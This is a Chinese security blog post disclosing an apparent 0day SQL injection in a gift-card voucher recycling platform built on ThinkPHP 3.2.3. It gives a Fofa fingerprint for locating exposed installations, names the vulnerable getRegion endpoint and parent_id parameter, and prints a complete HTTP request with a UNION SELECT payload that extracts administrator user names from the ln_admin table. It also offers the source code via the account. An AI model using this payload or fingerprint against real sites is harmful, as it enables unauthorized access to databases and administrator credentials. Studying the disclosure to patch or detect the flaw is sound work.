#  某礼品卡电子券收卡系统存在前台SQL注入漏洞   
 阿乐你好   2025-05-22 08:10  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/lSQtsngIibibSOeF8DNKNAC3a6kgvhmWqvoQdibCCk028HCpd5q1pEeFjIhicyia0IcY7f2G9fpqaUm6ATDQuZZ05yw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
点击上方  
蓝字  
关注我们 并设为  
星标  
## 0x00 前言  
  
**一个先进、稳定、功能完善的回收交易平台， 通过技术对接，全面实现线上回收各类虚拟卡。销卡速度快，到账稳定。 解决浪费：直接面对用户回收 出户即可提交卡号卡密完成回收交易 解决每年上十亿礼品卡闲置的问题。 资金回流：让企业闲置、员工FULI、 亲友相赠等方式获取的礼品卡快速 变现，以达到资金回流化实现利益。 交易多样：提供线上回收、线下交易API接口等多种交易方式**  
  
**Fofa指纹："/Application/Home/Static/css/style2.css"**  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5eNkiadvfRdqw1j0ySq6E9rhsEMX5dkwKLYC2vCauFBibMXR1gzu3FvH02QVx996Xud5ofchNX8Txiaw/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1 "")  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5eNkiadvfRdqw1j0ySq6E9rhAZcGX7Cbu7HsFmh4Ihiadg3RGjF79QztdvpNrhPaNAKfeiauIRAGxEXQ/640?wx_fmt=webp&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1 "")  
  
**框架:ThinkPHP 3.2.3 Debug:True**  
## 0x01 漏洞研究&复现  
  
位于 **/Application/Home/Controller/ApiController.class.php 的getRegion 方法，通过I函数GET传入 parent_id 参数，且直接被带入SQL查询字句中，导致漏洞产生.**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5c6RXq60udMWMibWCk9icgeIpDQWU8lh5LZUtdaZuZxAoJIQVYUu4vwFpOGt8SpzQZ0LRkrFb2vicohA/640?wx_fmt=png&from=appmsg "")  
  
Payload:  
  
```
GET  /Home/Api/getRegion/parent_id/1)%20union%20select%201,2,user_name,4,5,6,7,8,9%20from%20ln_admin%20where%20(1=1 HTTP/1.1Host: 127.0.0.1:8066Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Referer: http://127.0.0.1:8066/Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9Cookie: think_language=zh-CN; PHPSESSID=p4d3rprbojktlbnfhrd9gv1gk4Connection: keep-alive
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5c6RXq60udMWMibWCk9icgeIplRrQXVAIMyGQKwpvgoUaKibWFmU6BlHWoOyiagWRicejNm0RWABsw26FA/640?wx_fmt=png&from=appmsg "")  
## 0x02 源码下载  
  
**标签:代码审计，0day，渗透测试，系统，通用，0day，闲鱼，转转**  
  
**礼品卡源码关注公众号发送 250308 获取!**  
  
****  
  
****  
**免责声明:文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由读者承担全部法律及连带责任，文章作者和本公众号不承担任何法律及连带责任，望周知！！!**  
  
